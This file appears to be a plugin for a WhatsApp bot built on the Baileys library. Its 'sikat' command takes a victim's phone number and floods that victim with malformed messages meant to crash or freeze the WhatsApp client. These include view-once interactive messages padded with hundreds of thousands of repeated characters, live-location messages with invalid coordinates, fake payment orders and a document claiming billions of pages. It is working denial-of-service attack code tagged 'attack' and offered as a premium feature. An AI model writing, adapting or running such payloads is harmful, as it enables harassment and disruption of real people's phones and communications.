const fs = require('fs')
const { BufferJSON, 
WA_DEFAULT_EPHEMERAL, 
generateWAMessageFromContent, 
proto, 
generateWAMessageContent, 
generateWAMessage, 
prepareWAMessageMedia, 
areJidsSameUser, 
getContentType 
} = require('@adiwajshing/baileys')

async function skids(target, apalah) {
    var etc = generateWAMessageFromContent(target, proto.Message.fromObject({ viewOnceMessage: {message: {"interactiveMessage": {"header": {"title": "","subtitle": ""},"body": {"text": `PermenMisc V7 💀` + "ྦྷ".repeat(50000)},"footer": {"text": "KokNdakNgefekJir"},"nativeFlowMessage": {"buttons": [{"name": "cta_url","buttonParamsJson": "{ display_text : 'Skidayo', url : , merchant_url : }"}],"messageParamsJson": "".repeat(890989)}}}}

}), { userJid: target, quoted: apalah })
await conn.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })

}

async function memen(target) {
let msg = generateWAMessageFromContent(target, {
                        viewOnceMessage: {
                          message: {
                            "messageContextInfo": {
                              "deviceListMetadata": {},
                              "deviceListMetadataVersion": 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({
                              contextInfo: {
                                isForwarded: false,
                                externalAdReply: {
                                  title: 'PermenMisc V10',
                                  thumbnailUrl: 'https://telegra.ph/file/450c0f29b25e7d6e51cdd.jpg',
                                  sourceUrl: 'https://github.com/permenmd',
                                  mediaType: 2,
                                  renderLargerThumbnail: false
                                }
                              },
                              body: proto.Message.InteractiveMessage.Body.create({
                                text: "PermenMisc V10"
                              }),
                              footer: proto.Message.InteractiveMessage.Footer.create({}),
                              header: proto.Message.InteractiveMessage.Header.create({
                                subtitle: "PermenMisc V10",
                                hasMediaAttachment: false
                              }),
                              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [{
                                  "name": "quick_reply",
                                  "buttonParamsJson": `{\"display_text\":\"PermenMisc\",\"id\":. owner}`
                                }]
                              })
                            })
                          }
                        }
                      }, {
                        quoted: {
                          key: {
                            participant: '0@s.whatsapp.net',
                            remoteJid: "0@s.whatsapp.net"
                          },
                          message: {
                            conversation: "PermenMisc"
                          }
                        }
                      });
await conn.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id});

}
async function ngeloc(target, apalah) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({

viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `PermenMisc V7 💀` + "ྦྷ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}

}), { userJid: target, quoted: apalah })
await conn.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
let handler = async (m, { text }) => {
if (!text) {
	return m.reply('\`\`\`Invalid Usage\`\`\`\n.sikat 62888xxxx')
}
    try {
const halah =  text + '@s.whatsapp.net'
await m.reply('\`Sebentar Maniez...\`')
var etc = generateWAMessageFromContent(halah, proto.Message.fromObject({"viewOnceMessage": {"message": {"liveLocationMessage": {"degreesLatitude": "PermenMisc", "degreesLongitude": "PermenMisc", "caption": "PermenMisc", "sequenceNumber": "0", "jpegThumbnail": ""}}}}), {"userJid": halah, "quoted": {"key": {"participant": "0@s.whatsapp.net", ...( halah ? {"remoteJid": "status@broadcast"} : {})}, "message": {"interactiveMessage": {"header": {"title": ""}, "body": {"text": "PermenMisc"}, "footer": {"text": "dx - tools"}, "nativeFlowMessage": {"messageParamsJson": "".repeat(900000)}}}}}); 
for (let p = 0; p < 1; p++) {
	
await ngeloc(halah, {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./lib/m.jpg`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"PermenMisc؜\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
})
await memen(halah)
await conn.relayMessage(halah, etc.message, {"participant": {"jid": halah}, "messageId": etc.key.id});
await conn.relayMessage(halah, { viewOnceMessage: { message: { "interactiveMessage": { "header": { "subtitle": "�".repeat(850000), "title": "PermenMisc", "documentMessage": { "url": "https://mmg.whatsapp.net/v/t62.7119-24/22517900_978485827392706_104506907904661069_n.enc?ccb=11-4&oh=01_Q5AaILp8HNpP-8sF1nVTqrk7ALdiBwwceYLUbggCJNd3F8FH&oe=6695E945&_nc_sid=5e03e0&mms3=true", "mimetype": "application/pdf", "fileSha256": "bCgBlBDk/TlY7UX3LRW/CxCy17BXwKV0R38fAbtaaCM=", "fileLength": null, "pageCount": 99999999999, "mediaKey": "Q4+/kqk+tL2WPNQ/8KNt/JQyvvSO/GDLIqGZqf1+uoQ=", "fileName": "PermenMisc", "fileEncSha256": "Kl02f80WIWqlPFc6l23b8nVQFf/G5vCIO+RzXnQa6G0=", "directPath": "/v/t62.7119-24/22517900_978485827392706_104506907904661069_n.enc?ccb=11-4&oh=01_Q5AaILp8HNpP-8sF1nVTqrk7ALdiBwwceYLUbggCJNd3F8FH&oe=6695E945&_nc_sid=5e03e0", "mediaKeyTimestamp": "1718520002", "thumbnailDirectPath": "/v/t62.36145-24/55788163_783071483978711_6621387259821967506_n.enc?ccb=11-4&oh=01_Q5AaIDzjhTd7bn-_tJ2lvTvkGisD0ASz9oxYmQsCvtMAJGkL&oe=6695DECC&_nc_sid=5e03e0", "thumbnailSha256": "ftWaxLNQYJNwLFqi8WerCgQPSJX56pELyvpFpqHW5l8=", "thumbnailEncSha256": "42jb+dO5bSawAhrYuBiALm+6V1wmUXf8iulmXESU/+c=", "thumbnailHeight": 480, "thumbnailWidth": 339 }, "hasMediaAttachment": true }, "body": { "text": "PermenMisc" }, "nativeFlowMessage": { "buttons": [ { "name": "payment_method", "buttonParamsJson": "" } ], "messageParamsJson": "{\"name\":\"address_message\",\"title\":\"PermenMisc\",\"header\":\"null\",\"body\":\"PermenMisc\"}" } } } } }, { participant: { jid: halah }})
await conn.relayMessage(halah, {
                    viewOnceMessage: {
                      message: {
                        interactiveMessage: {
                          header: {
                            title: "",
                            locationMessage: {
                              degreesLatitude: "",
                              degreesLongitude: "",
                              jpegThumbnail: ""
                            },
                            hasMediaAttachment: true
                          },
                          body: {
                            text: "" + "\u0003".repeat(900000)
                          },
                          nativeFlowMessage: {
                            messageParamsJson: ""
                          },
                          carouselMessage: {}
                        }
                      }
                    }
                  }, {
                    participant: {
                      jid: halah
                    }
                  });
await skids(halah, {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `PermenMisc Skids`
}
}
})
await m.reply(`6`)
}
await conn.sendMessage(m.chat, {
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: global.title,
                    body: global.namabot,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnailUrl: global.attacking,
                    sourceUrl: ``
                }
            },
            text: `\`\`\`Sukses Maniez\`\`\` ${halah}`
        }, { quoted: m });
    } catch (error) {
        console.log(error)
    }
}

handler.help = ['sikat']
handler.tags = ['tools', 'attack'];
handler.premium = true
handler.command = /^(sikat)$/i;
module.exports = handler